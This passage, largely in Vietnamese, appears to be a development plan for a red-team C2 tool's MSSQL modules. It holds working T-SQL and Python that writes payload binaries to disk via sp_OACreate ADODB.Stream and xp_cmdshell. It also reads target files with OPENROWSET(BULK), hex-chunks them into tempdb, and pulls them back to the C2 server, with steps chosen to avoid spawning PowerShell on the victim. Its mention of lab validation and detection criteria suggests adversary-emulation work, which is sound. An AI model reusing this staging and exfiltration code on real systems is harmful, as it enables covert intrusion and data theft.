EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;                              -- adTypeBinary
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @bin;                         -- varbinary -> COM SAFEARRAY(VT_UI1)
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, '<out_path>', 2;         -- adSaveCreateOverWrite
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;
```

**Variable concatenation:** `SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX)) FROM tempdb..stg ORDER BY id` — portable từ SQL Server 2005+, không phụ thuộc `STRING_AGG` (2017+). Output binary-identical với `STRING_AGG` (đã verified trong TEST 4b). Bảng `stg` nên có `PRIMARY KEY` trên `id` để guarantee ordered scan cho variable concatenation pattern (xem Compatibility notes bên dưới).

**`sp_OAMethod Write` + varbinary:** SQL Server marshal varbinary qua COM interop thành `SAFEARRAY(VT_UI1)`. `ADODB.Stream.Write` chấp nhận Variant chứa byte array — documented technique cho binary file write từ T-SQL. Risk: chưa test với blob > 1MB trong environment này.

**Fallback nếu `Write` fail cho blob lớn:** chunked ADODB.Stream write — loop `sp_OASetProperty @obj, 'Position', @offset` + `sp_OAMethod @obj, 'Write', NULL, @chunk` từng đoạn 1MB. Hoặc: hex decode vẫn bằng T-SQL nhưng ghi qua `xp_cmdshell certutil -decodehex` (spawn process, nhưng vẫn bỏ được PowerShell + SqlClient loopback).

**Test trực tiếp trên IIS01 (không qua Python):**

```sql
-- Setup: stg table với hex content = "Hello World" (48656C6C6F20576F726C64)
EXECUTE AS LOGIN='sa';
USE tempdb;
IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;
CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));
INSERT INTO stg(chunk) VALUES ('48656C6C6F20576F726C64');
GO

-- Decode + write
EXECUTE AS LOGIN='sa';
DECLARE @hex VARCHAR(MAX) = '';
SELECT @hex = @hex + CAST(chunk AS VARCHAR(MAX))
FROM tempdb..stg ORDER BY id;
DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);
DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @bin;
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\test_decode.bin', 2;
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

-- Verify
EXEC xp_cmdshell 'type C:\ProgramData\test_decode.bin';
-- Expected: Hello World
EXEC xp_cmdshell 'del /f C:\ProgramData\test_decode.bin';
DROP TABLE tempdb..stg;
```

Scale test: repeat với payload thực (CertEnrollSvc.exe), verify `certutil -hashfile` SHA256 match.

**Done criteria:** T-SQL batch ghi binary chính xác cho text nhỏ và binary payload thực.

---

#### Bước P2.3 — Python `cmd_xpstage_hex` (`staging.py`) + shell routing

**Làm gì:** Thêm method `cmd_xpstage_hex` song song với `cmd_xpstage` hiện tại. Method cũ và các helper (`_build_decrypt_ps`, `_build_plain_ps`) giữ nguyên.

```python
def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
    """Stage binary to IIS01 via hex-encoded SQL + T-SQL ADODB.Stream decode (no .ps1)."""
    # 1. Request hex-encoded SQL from controlServer
    resp = shell._post_json("/api/v1.0/mssql/stage", {
        "handler": "toneshell",
        "payload": payload_name,
        "format":  "hex",          # ← new param, triggers StagePayloadHex
    })
    sql_file = resp["sqlFile"]

    # 2. Push SQL file to WS01, run sqlcmd -i (same as cmd_xpstage)
    remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
    shell.cmd_put_wait(sql_file, remote_sql)
    shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')

    # 3. T-SQL decode + ADODB.Stream write (replaces xpshell psh + PowerShell)
    out_path = f"C:\\ProgramData\\{payload_name}"
    decode_tsql = (
        "EXECUTE AS LOGIN='sa';"
        "DECLARE @hex VARCHAR(MAX)='';"
        "SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX))"
        " FROM tempdb..stg ORDER BY id;"
        "DECLARE @bin VARBINARY(MAX)=CONVERT(VARBINARY(MAX),'0x'+@hex,1);"
        "DECLARE @obj INT,@hr INT;"
        "EXEC @hr=sp_OACreate 'ADODB.Stream',@obj OUT;"
        "EXEC sp_OASetProperty @obj,'Type',1;"
        "EXEC sp_OAMethod @obj,'Open';"
        "EXEC sp_OAMethod @obj,'Write',NULL,@bin;"
        f"EXEC sp_OAMethod @obj,'SaveToFile',NULL,"
        f"'{self._tsql_escape(out_path)}',2;"
        "EXEC sp_OAMethod @obj,'Close';"
        "EXEC sp_OADestroy @obj;"
    )
    self._exec_q(shell, decode_tsql, timeout_s=timeout_s)

    # 4. Cleanup (same as cmd_xpstage)
    shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
    self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
        "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
    print(f"[+] xpstage-hex done -> {out_path}")
```

**Shell routing** (`toneshell_shell.py`): thêm `xpstage-hex` command, copy pattern từ `xpstage`:

```python
elif cmd == "xpstage-hex":
    if not rest[1:]:
        print("usage: xpstage-hex <payload_name>")
    else:
        self._xp.cmd_xpstage_hex(self, rest[1])
```

**Test:** chạy validation flow từ Transition strategy ở trên — stage cùng payload bằng cả `xpstage` và `xpstage-hex`, so sánh SHA256.

**Done criteria:** `xpstage-hex` thành công end-to-end, SHA256 match với `xpstage`, không `.ps1`/`powershell.exe` trên IIS01. `xpstage` cũ vẫn hoạt động bình thường.

---

#### Rủi ro P2

| Rủi ro | Mức | Mitigation |
|---|---|---|
| `sp_OAMethod Write` fail cho varbinary > 1MB | Trung bình | Test với payload thực trước; fallback: chunked sp_OA write loop hoặc `certutil -decodehex` |
| Hex doubles INSERT SQL file size | Thấp | Chấp nhận — `sqlcmd -i` handles multi-MB SQL files |
| Variable concat ordering | Rất thấp | Undocumented pattern nhưng universally reliable; thêm `PRIMARY KEY` trên `id` để guarantee clustered index ordered scan |
| `_exec_q` timeout cho large decode | Thấp | Pass `timeout_s` parameter; decode nhanh hơn PowerShell AES |

---

### P3 — Exfil absorption: OPENROWSET(BULK) + T-SQL hex INSERT

**Mục tiêu:** Loại bỏ per-chunk `.ps1` INSERT từ `xpexfil`. Hiện tại mỗi chunk chạy PowerShell trên IIS01 (qua `xpshell psh`) để đọc file portion, AES encrypt, base64 encode, INSERT vào `tempdb..exfil`. Sau P3, IIS01 đọc toàn bộ file bằng `OPENROWSET(BULK)` và INSERT hex chunks bằng T-SQL — **một lần duy nhất** cho tất cả file-chunks, thay vì N lần PowerShell spawn.

**Transition strategy — song song với P2:** thêm `cmd_xpexfil_hex` + shell command `xpexfil-hex` song song với `cmd_xpexfil` hiện tại. Cutover cùng lúc hoặc sau P2 — cùng validation flow (so sánh SHA256 output).

**So sánh pipeline:**

| Bước | Hiện tại | Sau P3 |
|---|---|---|
| Read+INSERT (IIS01) | Per file-chunk: `xpshell psh` -> `sqlservr->cmd->powershell` (OpenRead + Seek + AES encrypt + base64 + SqlClient INSERT `tempdb..exfil`) | Một lần: `_exec_q` -> T-SQL in `sqlservr.exe` (`OPENROWSET(BULK)` -> `SUBSTRING` per chunk -> hex -> INSERT all) |
| Confirm INSERT | Per file-chunk: poll `OBJECT_ID('tempdb..exfil')` mỗi 15s | Không cần — `_exec_q` blocking |
| Extract (WS01) | Per file-chunk: PowerShell (SqlClient read + base64 decode + AES decrypt + `WriteAllBytes`) | Per file-chunk: PowerShell (SqlClient read hex text -> write raw hex file — no decode on WS01) |
| Decode | PowerShell AES decrypt trên WS01 | Python `bytes.fromhex()` trên C2 — instant cho mọi size |
| Process spawn trên IIS01 | N × (`cmd.exe` + `powershell.exe`) | Không có |
| Process spawn trên WS01 | N × `powershell.exe` (extract + decrypt) | N × `powershell.exe` (extract only — chỉ write hex text, không decode) |

> **Design revision (2026-09-15):** ban đầu thiết kế hex decode trên WS01 bằng PowerShell byte loop `[Convert]::ToByte($hex.Substring($i,2),16)`. Đánh giá cho thấy byte loop chậm ~1000x so với `FromBase64Transform` hiện tại (10MB chunk ≈ 20–50 phút vs <1 giây). Chuyển sang kéo hex text thô về C2, decode bằng Python `bytes.fromhex()` — đơn giản hơn, nhanh hơn, loại bỏ hoàn toàn decode overhead trên WS01.
>
> **OPENROWSET(BULK) file permissions:** `OPENROWSET(BULK)` đọc dưới OS identity của `sqlservr.exe` (`NT SERVICE\MSSQL$SQLEXPRESS`), không phải SA context. Tương tự, `xp_cmdshell` cũng spawn process dưới cùng identity. Nên nếu `xpexfil` hiện tại đọc được file (qua PowerShell `[IO.File]::OpenRead`), thì `OPENROWSET(BULK)` cũng đọc được — cùng OS identity, cùng ACL check. Paths trong `C:\ProgramData\` OK mặc định. Paths trong SYSTEM TEMP (`C:\Windows\system32\config\systemprofile\AppData\Local\Temp\`) cần ACL cho service account hoặc SQL Server service chạy dưới LocalSystem.

---

#### Bước P3.1 — T-SQL read+chunk+INSERT batch

**Làm gì:** T-SQL batch chạy trên IIS01 (qua `_exec_q` từ WS01) đọc file bằng `OPENROWSET(BULK)`, chia file-chunks, hex encode từng chunk, INSERT tất cả vào `tempdb..exfil` với `chunk_idx` phân biệt file-chunks.

```sql
EXECUTE AS LOGIN='sa';

-- 1. Đọc toàn bộ file thành varbinary(MAX)
DECLARE @data VARBINARY(MAX);
SELECT @data = BulkColumn
FROM OPENROWSET(BULK '<remote_path>', SINGLE_BLOB) AS t;

DECLARE @total INT = DATALENGTH(@data);

-- 2. Tạo exfil table (thêm chunk_idx để phân biệt file-chunks)
IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
CREATE TABLE tempdb..exfil (
    id        INT IDENTITY(1,1),
    chunk_idx INT            NOT NULL,   -- file-chunk index (0, 1, 2, ...)
    chunk     NVARCHAR(MAX)  NOT NULL    -- hex rows (≤8000 chars)
);
GRANT SELECT ON tempdb..exfil TO PUBLIC;

-- 3. Loop: mỗi file-chunk -> SUBSTRING -> hex -> sub-chunk INSERT rows
DECLARE @chunk_bytes INT = <chunk_mb> * 1048576;
DECLARE @i INT = 0;
WHILE @i * @chunk_bytes < @total
BEGIN
    DECLARE @off INT = @i * @chunk_bytes + 1;   -- SUBSTRING 1-based
    DECLARE @len INT = CASE
        WHEN @off + @chunk_bytes - 1 > @total
        THEN @total - @off + 1
        ELSE @chunk_bytes END;

    -- SUBSTRING binary -> hex (style 2: no '0x' prefix)
    DECLARE @hex VARCHAR(MAX) = CONVERT(VARCHAR(MAX),
        SUBSTRING(@data, @off, @len), 2);

    -- Sub-chunk hex into ≤8000-char INSERT rows
    DECLARE @j INT = 1;
    WHILE @j <= LEN(@hex)
    BEGIN
        INSERT INTO tempdb..exfil (chunk_idx, chunk)
        VALUES (@i, SUBSTRING(@hex, @j, 8000));
        SET @j = @j + 8000;
    END
    SET @i = @i + 1;
END

-- Report
SELECT @i AS num_chunks, @total AS file_bytes,
       (SELECT COUNT(*) FROM tempdb..exfil) AS total_rows;
```

**`OPENROWSET(BULK ... SINGLE_BLOB)`:** đọc file local thành `varbinary(MAX)`. Không cần `Ad Hoc Distributed Queries` (BULK provider là local I/O, không phải OLE DB remote). Cần `ADMINISTER BULK OPERATIONS` permission — `sa` context đã có.

**File permission:** `OPENROWSET(BULK)` đọc dưới SQL Server service identity (`NT SERVICE\MSSQL$SQLEXPRESS`). File trong `C:\ProgramData\` -> OK (mặc định readable). File ngoài standard paths -> verify ACL trên lab.

**Memory:** `OPENROWSET(BULK ... SINGLE_BLOB)` load toàn bộ file vào `varbinary(MAX)`. Peak memory ≈ file size + 2× hex text + INSERT buffer. SQL Server Express có giới hạn buffer pool — verify trên lab bằng `SELECT value_in_use FROM sys.configurations WHERE name = 'max server memory (MB)'`. File trong plan đều < 100MB — expected safe, nhưng validate với file lớn nhất trước khi chạy thật.

**Test trực tiếp trên IIS01:**

```sql
-- Setup: tạo test file
EXECUTE AS LOGIN='sa';
EXEC xp_cmdshell 'echo Hello Exfil Test > C:\ProgramData\exfil_test.txt';
GO

-- Run INSERT batch (chunk_mb = 10, thực tế file < 1KB nên 1 chunk)
EXECUTE AS LOGIN='sa';
DECLARE @data VARBINARY(MAX);
SELECT @data = BulkColumn FROM OPENROWSET(
    BULK 'C:\ProgramData\exfil_test.txt', SINGLE_BLOB) AS t;
IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
CREATE TABLE tempdb..exfil (id INT IDENTITY(1,1), chunk_idx INT NOT NULL,
    chunk NVARCHAR(MAX) NOT NULL);
GRANT SELECT ON tempdb..exfil TO PUBLIC;
INSERT INTO tempdb..exfil (chunk_idx, chunk)
VALUES (0, CONVERT(VARCHAR(MAX), @data, 2));

-- Verify
SELECT chunk_idx, LEN(chunk) AS hex_len, LEFT(chunk, 40) AS preview
FROM tempdb..exfil;
-- Expected: chunk_idx=0, hex chứa hex-encoded "Hello Exfil Test\r\n"

-- Cleanup
DROP TABLE tempdb..exfil;
EXEC xp_cmdshell 'del /f C:\ProgramData\exfil_test.txt';
```

Scale test: chạy với file thật (e.g., `C:\ProgramData\CertEnrollSvc.exe`) -> verify chunk count + total hex length = 2 × file size.

**Done criteria:** T-SQL batch INSERT thành công cho test file nhỏ và binary payload thực, `chunk_idx` phân biệt đúng file-chunks.

---

#### Bước P3.2 — Python `cmd_xpexfil_hex` (`exfil.py`) + shell routing

**Làm gì:** Thêm `cmd_xpexfil_hex` song song với `cmd_xpexfil` hiện tại. Method cũ và các helper giữ nguyên. Ba thay đổi so với `cmd_xpexfil`:

**a. IIS01 INSERT step:** thay per-chunk `_build_exfil_insert_ps` + `cmd_xpshell_psh` bằng `_exec_q` chạy T-SQL batch từ P3.1 **một lần duy nhất**. Không cần OBJECT_ID polling — `_exec_q` blocking.

```python
# cmd_xpexfil hiện tại (giữ nguyên):
#   for i in range(num_chunks):
#       self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(...))
#       while poll OBJECT_ID: sleep(15)  # confirm INSERT

# cmd_xpexfil_hex (mới):
insert_tsql = self._build_exfil_insert_tsql(remote_path, chunk_mb)
self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
# T-SQL batch tự chia file-chunks, INSERT tất cả — 1 lần, không cần loop/poll
```

**b. WS01 extract step:** thêm `_build_exfil_extract_hex_ps` — chỉ đọc hex text từ SQL và ghi file thô (không decode trên WS01). Thêm `WHERE chunk_idx=@i` filter (table mới có `chunk_idx` column). Hex decode chuyển sang Python trên C2.

```python
def _build_exfil_extract_hex_ps(self, local_path: str, chunk_idx: int) -> str:
    """PowerShell run on WS01: read hex chunks for one file-chunk, write raw hex text."""
    connstr = (f"Server={self._host.replace(':', ',')};Database=tempdb;"
               f"User ID={self._login};Password={self._password};"
               f"TrustServerCertificate=True")
    return (
        f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
        "$cn.Open();$cm=$cn.CreateCommand();"
        f"$cm.CommandText='SELECT chunk FROM tempdb..exfil "
        f"WHERE chunk_idx={chunk_idx} ORDER BY id';"
        "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
        "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
        "$rd.Close();$cn.Close();"
        f"[IO.File]::WriteAllText('{local_path}',$sb.ToString())"
    )
```

> **Design revision (2026-09-15):** ban đầu thiết kế hex decode trên WS01 bằng byte loop (`[Convert]::ToByte($hex.Substring($i,2),16)`). Đánh giá cho thấy 10MB chunk = 5 triệu loop iterations ≈ 20–50 phút trong PowerShell 5.1 (so với <1 giây cho `FromBase64Transform` hiện tại). Chuyển sang viết hex text thô ra file -> kéo về C2 -> decode bằng Python `bytes.fromhex()`.

**c. Loop restructure:** INSERT 1 lần trước loop (T-SQL blocking), loop chỉ còn extract hex text + upload per file-chunk. Drop table sau loop. **C2 Python decode** hex -> binary sau khi tất cả chunks về.

```python
def cmd_xpexfil_hex(self, shell, remote_path, local_name,
                    insert_timeout_s=600, chunk_mb=10):
    # A — get file size (same as cmd_xpexfil)
    file_size = self._get_remote_file_size(shell, remote_path)
    num_chunks = math.ceil(file_size / (chunk_mb * 1024 * 1024))

    # B — ONE T-SQL batch: read file + chunk + hex + INSERT all
    insert_tsql = self._build_exfil_insert_tsql(remote_path, chunk_mb)
    print(f"[*] xpexfil-hex: T-SQL INSERT all {num_chunks} chunk(s) ...")
    self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)

    # C — per file-chunk: extract hex text from exfil table + upload to C2
    for i in range(num_chunks):
        chunk_local = f"C:\\Windows\\Temp\\{local_name}.hex{i}"
        extract_ps = self._build_exfil_extract_hex_ps(chunk_local, chunk_idx=i)
        shell.cmd_exec_raw(
            f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
        shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.hex{i}")
        shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")

    # D — cleanup
    self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
        "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;")

    # E — C2-side: hex decode + assemble binary
    self._assemble_hex_chunks(local_name, num_chunks)

def _assemble_hex_chunks(self, local_name, num_chunks):
    """Decode hex text chunks to binary and assemble on C2."""
    out_path = os.path.join(_UPLOAD_DIR, local_name)
    with open(out_path, 'wb') as out_f:
        for i in range(num_chunks):
            hex_path = os.path.join(_UPLOAD_DIR, f"{local_name}.hex{i}")
            with open(hex_path, 'r') as hf:
                hex_text = hf.read()
            out_f.write(bytes.fromhex(hex_text))
            os.remove(hex_path)
    print(f"[+] xpexfil-hex done -> {out_path}")
```

**Shell routing:** thêm `xpexfil-hex` command:

```python
elif cmd == "xpexfil-hex":
    # same arg parsing as xpexfil
    self._xp.cmd_xpexfil_hex(self, remote_path, local_name, ...)
```

**Validation flow:** exfil cùng file bằng cả `xpexfil` và `xpexfil-hex`, compare SHA256 trên C2:

```
xpexfil C:\ProgramData\CertEnrollSvc.exe cert_old.exe
xpexfil-hex C:\ProgramData\CertEnrollSvc.exe cert_new.exe
# Compare SHA256 of cert_old.exe vs cert_new.exe on C2
```

Verify: `.hex{i}` intermediate files trên WS01 chứa hex text thuần (không phải binary). `bytes.fromhex()` trên C2 produces binary-identical output.

**Cutover criteria:** giống P2 — SHA256 match, không `powershell.exe` trên IIS01 cho INSERT step. Sau cutover: `xpexfil` -> hex path, `xpexfil-legacy` -> old path.

**Done criteria:** `xpexfil-hex` thành công end-to-end, SHA256 match, IIS01 không spawn `powershell.exe` cho INSERT step, WS01 PowerShell chỉ write hex text (không decode). `xpexfil` cũ vẫn hoạt động.

---

#### Rủi ro P3

| Rủi ro | Mức | Mitigation |
|---|---|---|
| `OPENROWSET(BULK)` memory cho file > 100MB | Trung bình | Peak memory ≈ file_size + 3×chunk_bytes; Express 1GB limit -> file < 500MB OK; plan files đều < 100MB (~130MB peak) |
| File permission cho non-standard paths | Thấp | `OPENROWSET(BULK)` dùng cùng OS identity với `xp_cmdshell` — nếu `xpexfil` hiện tại đọc được thì `OPENROWSET` cũng đọc được; `C:\ProgramData\` mặc định OK; SYSTEM TEMP cần verify ACL cho service account |
| `DECLARE` scope trong `WHILE` loop | Không có | ~~SQL Server 2022~~ Hoạt động từ SQL Server 2008: `DECLARE @var = expr` trong loop body là re-assignment, không phải re-declaration (batch-scoped) |
| Hex text intermediate file size trên WS01 | Thấp | 10MB chunk -> 20MB hex text file trên `C:\Windows\Temp\` — chấp nhận được; `C:\Windows\Temp\` disk space luôn đủ |

> **Removed risk (2026-09-15):** "Hex decode performance trong PowerShell (WS01)" — loại bỏ bằng design revision: WS01 chỉ write hex text thô, decode chuyển sang Python `bytes.fromhex()` trên C2 (instant cho mọi size).

---

### Compatibility notes (P2 + P3)

> Added 2026-09-15 — đánh giá tương thích MSSQL cho toàn bộ controlServer + controlShell.

**Effective minimum: SQL Server 2008** (tất cả pipeline). Nếu bỏ xpagent: SQL Server 2005.

| Pipeline | Min version | Bottleneck feature |
|---|---|---|
| xpshell (cmd/psh) | 2005 | `VARCHAR(MAX)`, `EXECUTE AS LOGIN`, sp_OA |
| xpstage (base64+AES) | 2005 | Tương tự xpshell |
| xpstage-hex (hex+ADODB) | 2005 | `CONVERT(VARBINARY(MAX), style 1)`, variable concat |
| xpexfil | 2005 | PowerShell `.NET` trên target (không phụ thuộc T-SQL version) |
| xpexfil-hex (P3) | 2008 | `DECLARE @var = expr` inline init (2008+), `OPENROWSET(BULK)` |
| xpagent (Service Broker) | 2008 | `DATETIME2`, `SYSDATETIME()` |

**SQL Server 2005 fix** (nếu cần): `DATETIME2` -> `DATETIME`, `SYSDATETIME()` -> `GETDATE()`, tách `DECLARE` + `SET`.

**Express Edition concerns:**
- OLE Automation, xp_cmdshell, Service Broker self-dialog: có trên mọi Express edition
- Memory limit: 1GB (2008–2014), 1.4GB (2016+) — ảnh hưởng `OPENROWSET(BULK)` cho file lớn
- Database size limit: 4GB (2005–2014), 10GB (2016+) — không ảnh hưởng tempdb staging cho plan payloads

**Nên apply:**
- Thêm `PRIMARY KEY` cho `id` trong `CREATE TABLE stg` (`mssql.go` cả `StagePayload` lẫn `StagePayloadHex`) — guarantee clustered index ordered scan cho variable concatenation pattern

---

### P4 — Plan updates

Chỉ làm sau khi P2/P3 validated trên lab. Scope:
- Rewrite affected Detection Criteria rows trong Phase files (staging/exfil observable changes)
- Re-run `write-detection-criteria` -> `assign-category` trên modified rows
- Re-check scope: `check.py --scope "Scenario 1.md"`
